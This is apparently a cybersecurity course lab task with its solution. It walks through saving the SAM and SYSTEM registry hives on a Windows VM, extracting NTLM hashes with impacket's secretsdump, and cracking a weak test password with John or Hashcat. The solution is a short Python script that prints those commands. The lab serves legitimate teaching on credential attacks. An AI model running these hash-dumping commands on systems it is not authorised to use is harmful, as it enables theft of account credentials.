# 🐍 SAM-urai's Scroll

**Course:** Cyber Security Analyst - Windows Credentials Attacks | **Date:** 22 October 2025

---

## Task

**Goal:**  
Extract Windows password hashes from registry hives and attempt to crack them on Kali.

**Requirements:**

- Create a weak local user on your Windows VM (e.g. `testuser` `password123`)
    
- From an elevated Command Prompt, run:
    
- Transfer the hive files to your Kali machine.
    
- Extract NTLM hashes using [`secretsdump.py`](http://secretsdump.py) , which is part of `impacket` python library (install with `pip3 install impacket` )
    
- Output:
    
    - `Submit the final result in the exact format requested by the task.`
        
    - `A reviewer-readable final result`
        
    - `The submission artifact requested by the task`

---

## Solution

```python
steps = [
    r"reg save HKLM\SAM C:\Temp\sam.hiv",
    r"reg save HKLM\SYSTEM C:\Temp\system.hiv",
    "secretsdump.py -sam sam.hiv -system system.hiv LOCAL",
    "Crack the extracted NTLM hash with John or Hashcat.",
    "Recovered weak password: password123",
]

for line in steps:
    print(line)
```








